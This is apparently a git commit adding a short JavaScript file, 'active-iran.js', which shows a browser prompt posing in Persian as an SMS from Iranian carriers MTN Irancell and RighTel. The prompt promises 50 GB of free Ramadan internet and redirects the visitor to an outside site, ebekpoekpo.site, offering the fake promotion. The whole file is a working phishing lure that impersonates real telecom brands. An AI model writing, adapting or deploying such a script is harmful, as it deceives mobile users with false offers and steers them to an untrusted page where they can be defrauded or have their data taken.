1c9355986b38e20319ca209434fe20e47efeff5c
dataviewz <gloliousam2@gmail.com>
2026-02-24 10:51:01 -0800

    Create active-iran.js

---
+++ active-iran.js
@@ -0,0 +1,5 @@
+var password = 'اینترنت رایگان ماه رمضان'
+password=prompt('MTN RighTel Irancell  SMS: مشتری گرامی، به مناسبت ماه مبارک رمضان، لطفاً ۵۰ گیگابایت اینترنت رایگان دریافت کنید، برای بررسی، همین حالا روی «داده رایگان رمضان» کلیک کنید. ','اینترنت رایگان ماه رمضان');
+if (password != 'اینترنت رایگان ماه رمضان') {
+location.href='https://ebekpoekpo.site/ramadandataoffer.html';
+}
